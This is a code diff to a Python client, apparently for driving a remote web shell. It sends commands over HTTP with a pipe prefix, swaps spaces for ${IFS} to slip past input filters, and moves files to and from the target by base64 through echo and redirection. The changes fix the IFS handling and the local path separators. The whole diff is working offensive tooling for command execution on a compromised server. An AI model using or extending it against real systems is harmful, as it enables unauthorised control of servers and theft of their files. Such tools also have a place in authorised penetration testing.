@@ -57,7 +57,10 @@ try:
    PARAM = args.param
    PIPE = ""
    COMMAND_LIST = ["ls", "dir", "cat", "type", "rm", "del", "file"]
-   space = " "
+   if str(sys.platform) == "linux":
+      localslash = "/"
+   else:
+      localslash = "\\" 
    if args.pipe:
       PIPE = "|"
    whoami = send_command(PIPE + "whoami", WEBSHELL, HTTP_METHOD, PARAM)
@@ -98,13 +101,15 @@ try:
             cinput += (colored(" ", "blue", "on_yellow")) ; cinput += (colored(path.rstrip() + " ", "grey", "on_yellow"))
          cinput += (colored(" ", "yellow"))
          command = input(cinput + "\001\033[0m\002")
+         if args.ifs:
+            command = command.replace(" ","${IFS}")
+            space = "${IFS}"
+         if not args.ifs:
+            space = " "
          if command == "exit":
             print (colored("[!] Exiting..\n", "red"))
             break
          else:
-            if args.ifs:
-               command = command.replace("space","${IFS}")
-               space = "${IFS}"
             if len(command) == 0:
                print("\n")
                continue
@@ -115,13 +120,15 @@ try:
                os.system("clear")
                continue
             if "upload" in command.split()[0]:
+               if args.ifs:
+                  command = command.replace("${IFS}"," ")
                if len(command.split()) == 1 or len(command.split()) == 2:
                   print (colored("[!] Usage: upload local_file.ext remote_file.ext\n", "red"))
                else:
                   localfile = command.split()[1]
                   remotefile = command.split()[2]
                   if remotefile == ".":
-                     remotefile = localfile
+                     remotefile = command.split()[1]
                   if not slash in remotefile:
                      if remotefile == localfile:
                         remotefile = path.rstrip() + slash + command.split()[1]
@@ -135,7 +142,7 @@ try:
                   except OSError:
                      print (colored("[!] Local file " + localfile + " does not exist!\n", "red"))
                      continue
-                  print (colored("[+] Uploading file "+ cwd + slash + localfile + " on " + remotefile + "..\n", "red"))
+                  print (colored("[+] Uploading file " + cwd + localslash + localfile + " on " + remotefile + "..\n", "red"))
                   upload = send_command(PIPE + "echo" + space + str(base64data.rstrip(), "utf8") + space +
                   ">" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                   if system == "linux":
@@ -146,6 +153,8 @@ try:
                      send_command(PIPE + "$base64 = cat -Encoding UTF8 " + remotefile + command + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
             else:
                if "download" in command.split()[0]: 
+                  if args.ifs:
+                     command = command.replace("${IFS}"," ")
                   if len(command.split()) == 1 or len(command.split()) == 2:
                      print (colored("[!] Usage: download remote_file.ext local_file.ext\n", "red"))
                   else:
@@ -157,9 +166,9 @@ try:
                         cwd = os.getcwd()
                         if localfile == ".":
                            localfile = command.split()[1]
-                        print (colored("[+] Downloading file "+ remotefile +" on "+ cwd + slash + localfile +"..\n", "red"))
+                        print (colored("[+] Downloading file " + remotefile + " on " + cwd + localslash + localfile + "..\n", "red"))
                      if slash in localfile:
-                        print (colored("[+] Downloading file "+ remotefile +" on "+ localfile +"..\n", "red"))
+                        print (colored("[+] Downloading file " + remotefile + " on " + localfile + "..\n", "red"))
                      if system == "linux":
                         base64data = send_command(PIPE + "base64" + space + remotefile, WEBSHELL, HTTP_METHOD, PARAM) 
                      if system == "windows":
